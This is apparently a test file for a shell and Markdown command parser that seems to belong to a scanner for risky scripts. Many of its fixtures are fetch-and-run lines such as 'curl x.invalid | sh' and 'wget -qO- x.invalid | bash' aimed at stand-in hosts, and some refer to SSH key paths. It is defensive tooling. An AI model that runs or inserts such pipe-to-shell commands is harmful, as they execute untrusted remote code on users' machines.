import { expect, test } from "bun:test";
import { mapHome, shellStatements } from "./shell.ts";

const script = (...lines: string[]) => shellStatements(lines.join("\n"), false);
const markdown = (...lines: string[]) => shellStatements(lines.join("\n"), true);

const outline = (statements: ReturnType<typeof shellStatements>) =>
  statements.map(({ kind, line, text, commands }) => ({
    kind,
    line,
    text,
    commands: commands.map((command) => command.words),
  }));

test("statements split on ; && || & and pipes split commands", () => {
  expect(
    outline(script("cd /tmp; make && make install || echo failed & curl x.invalid | sh")),
  ).toEqual([
    { kind: "code", line: 1, text: "cd /tmp", commands: [["cd", "/tmp"]] },
    { kind: "code", line: 1, text: "make", commands: [["make"]] },
    { kind: "code", line: 1, text: "make install", commands: [["make", "install"]] },
    { kind: "code", line: 1, text: "echo failed", commands: [["echo", "failed"]] },
    {
      kind: "code",
      line: 1,
      text: "curl x.invalid | sh",
      commands: [["curl", "x.invalid"], ["sh"]],
    },
  ]);
});

test("each line starts a statement with its own line number", () => {
  expect(script("#!/bin/sh", "", "echo one", "  echo two").map((s) => [s.line, s.text])).toEqual([
    [1, "!/bin/sh"],
    [3, "echo one"],
    [4, "echo two"],
  ]);
});

test("quotes and substitutions keep their operators inside one word", () => {
  const [statement] = script(`python3 -c "import a;exec(b)" | sh -c 'x && y' $(a | b; c)`);
  expect(statement!.commands.map((command) => command.words)).toEqual([
    ["python3", "-c", "import a;exec(b)"],
    ["sh", "-c", "x && y", "$(a | b; c)"],
  ]);
});

test("an & inside a word, a redirect, or |& does not end the statement", () => {
  expect(outline(script("curl https://h.invalid/i?a=1&b=2 2>&1 &>/dev/null |& sh"))).toEqual([
    {
      kind: "code",
      line: 1,
      text: "curl https://h.invalid/i?a=1&b=2 2>&1 &>/dev/null |& sh",
      commands: [["curl", "https://h.invalid/i?a=1&b=2", "2>&1", "&>/dev/null"], ["sh"]],
    },
  ]);
});

test("a backslash continuation joins lines into one statement on its first line", () => {
  expect(outline(script("echo start", "curl -fsSL x.invalid \\", "  | sh"))).toEqual([
    { kind: "code", line: 1, text: "echo start", commands: [["echo", "start"]] },
    {
      kind: "code",
      line: 2,
      text: "curl -fsSL x.invalid | sh",
      commands: [["curl", "-fsSL", "x.invalid"], ["sh"]],
    },
  ]);
});

const pipeline = (line: string) => script(line)[0]!.commands.map((command) => command.words);

test("wrappers, their options, and leading assignments are skipped", () => {
  expect(pipeline("wget -qO- x.invalid | sudo -E bash -s")).toEqual([
    ["wget", "-qO-", "x.invalid"],
    ["bash", "-s"],
  ]);
  expect(pipeline("sudo -u root env FOO=1 nohup time doas xargs -n1 sh run.sh")).toEqual([
    ["sh", "run.sh"],
  ]);
  expect(pipeline("LANG=C python3 -")).toEqual([["python3", "-"]]);
});

test("each command keeps the wrappers it skipped", () => {
  const [statement] = script("sudo -u root nohup setsid python3 x.py | doas tee out");
  expect(statement!.commands.map((command) => command.wrappers)).toEqual([
    ["sudo", "nohup", "setsid"],
    ["doas"],
  ]);
});

test("a statement ended by a single & runs in the background", () => {
  expect(script("a & b && c; d &").map((s) => [s.text, s.background])).toEqual([
    ["a", true],
    ["b", false],
    ["c", false],
    ["d", true],
  ]);
  expect(script("a >/dev/null 2>&1 &")[0]!.background).toBe(true);
});

test("substitutions are recorded with their kind, backticks as $(", () => {
  const [statement] = script('bash <(curl -s x.invalid) "$(wget -qO- y.invalid | cat)" `z`');
  expect(statement!.commands[0]!.substitutions).toEqual([
    { kind: "<(", body: "curl -s x.invalid" },
    { kind: "$(", body: "wget -qO- y.invalid | cat" },
    { kind: "$(", body: "z" },
  ]);
});

test("a comment scans as its own statement and does not swallow a continuation", () => {
  expect(
    outline(script("# curl x.invalid | sh \\", "echo real # trailing; note", "  // js note")),
  ).toEqual([
    {
      kind: "comment",
      line: 1,
      text: "curl x.invalid | sh \\",
      commands: [
        ["curl", "x.invalid"],
        ["sh", "\\"],
      ],
    },
    { kind: "code", line: 2, text: "echo real", commands: [["echo", "real"]] },
    { kind: "comment", line: 2, text: "trailing", commands: [["trailing"]] },
    { kind: "comment", line: 2, text: "note", commands: [["note"]] },
    { kind: "comment", line: 3, text: "js note", commands: [["js", "note"]] },
  ]);
});

test("a backslash in a trailing comment does not continue the line", () => {
  expect(
    outline(script("echo setup # see docs \\", "curl x.invalid | sh", 'echo "a # b" \\', "  done")),
  ).toEqual([
    { kind: "code", line: 1, text: "echo setup", commands: [["echo", "setup"]] },
    { kind: "comment", line: 1, text: "see docs \\", commands: [["see", "docs", "\\"]] },
    {
      kind: "code",
      line: 2,
      text: "curl x.invalid | sh",
      commands: [["curl", "x.invalid"], ["sh"]],
    },
    { kind: "code", line: 3, text: 'echo "a # b" done', commands: [["echo", "a # b", "done"]] },
  ]);
});

test("a heredoc body scans line by line, and an open quote in it ends with its line", () => {
  expect(outline(script("bash <<'EOF'", "echo it's", "curl x.invalid | sh", "EOF"))).toEqual([
    { kind: "code", line: 1, text: "bash <<'EOF'", commands: [["bash", "<<EOF"]] },
    { kind: "code", line: 2, text: "echo it's", commands: [["echo", "its"]] },
    {
      kind: "code",
      line: 3,
      text: "curl x.invalid | sh",
      commands: [["curl", "x.invalid"], ["sh"]],
    },
    { kind: "code", line: 4, text: "EOF", commands: [["EOF"]] },
  ]);
});

test("Markdown prose and inline code are prose, fences are code with comments", () => {
  const statements = markdown(
    "Never run `curl x.invalid | sh`; read it first.",
    "",
    "```bash",
    "# curl y.invalid | sh",
    "wget -qO- z.invalid \\",
    "  | bash",
    "```",
    "Don't pipe it | sh",
  );
  expect(outline(statements)).toEqual([
    { kind: "prose", line: 1, text: "Never run", commands: [["Never", "run"]] },
    {
      kind: "prose",
      line: 1,
      text: "curl x.invalid | sh",
      commands: [["curl", "x.invalid"], ["sh"]],
    },
    { kind: "prose", line: 1, text: "read it first.", commands: [["read", "it", "first."]] },
    {
      kind: "comment",
      line: 4,
      text: "curl y.invalid | sh",
      commands: [["curl", "y.invalid"], ["sh"]],
    },
    {
      kind: "code",
      line: 5,
      text: "wget -qO- z.invalid | bash",
      commands: [["wget", "-qO-", "z.invalid"], ["bash"]],
    },
    {
      kind: "prose",
      line: 8,
      text: "Don't pipe it | sh",
      commands: [["Don't", "pipe", "it"], ["sh"]],
    },
  ]);
});

test("a prose statement's index points at its text in the source", () => {
  const source = "Intro.\nThen run `curl x.invalid | sh` now.";
  for (const statement of markdown(...source.split("\n"))) {
    expect(source.slice(statement.index, statement.index + statement.text.length)).toBe(
      statement.text,
    );
  }
});

test("every home spelling maps to the home token", () => {
  for (const spelling of [
    "~/.ssh/id_ed25519",
    "$HOME/.ssh/id_ed25519",
    "${HOME}/.ssh/id_ed25519",
    "/Users/ada/.ssh/id_ed25519",
    "/home/ada/.ssh/id_ed25519",
    "%USERPROFILE%/.ssh/id_ed25519",
    "$env:USERPROFILE/.ssh/id_ed25519",
    "C:\\Users\\ada/.ssh/id_ed25519",
  ]) {
    expect(mapHome(spelling)).toBe("~/.ssh/id_ed25519");
  }
  expect(mapHome("/Users/ada")).toBe("~");
  expect(mapHome("$HOMEBREW_PREFIX/bin")).toBe("$HOMEBREW_PREFIX/bin");
  expect(mapHome("/srv/home/ada")).toBe("/srv/home/ada");
});

test("command words map home spellings", () => {
  expect(script('sh "$HOME/setup.sh"')[0]!.commands[0]!.words).toEqual(["sh", "~/setup.sh"]);
});

test("a backslash escapes shell characters only, so Windows paths keep theirs", () => {
  expect(pipeline(String.raw`echo a\ b \$x C:\Users\ada\s.ps1 %USERPROFILE%\s.ps1`)).toEqual([
    ["echo", "a b", "$x", String.raw`~\s.ps1`, String.raw`~\s.ps1`],
  ]);
});

test("a Markdown table row scans only its inline code", () => {
  expect(outline(markdown("| client | curl, wget | `curl x.invalid | sh` |"))).toEqual([
    {
      kind: "prose",
      line: 1,
      text: "curl x.invalid | sh",
      commands: [["curl", "x.invalid"], ["sh"]],
    },
  ]);
});
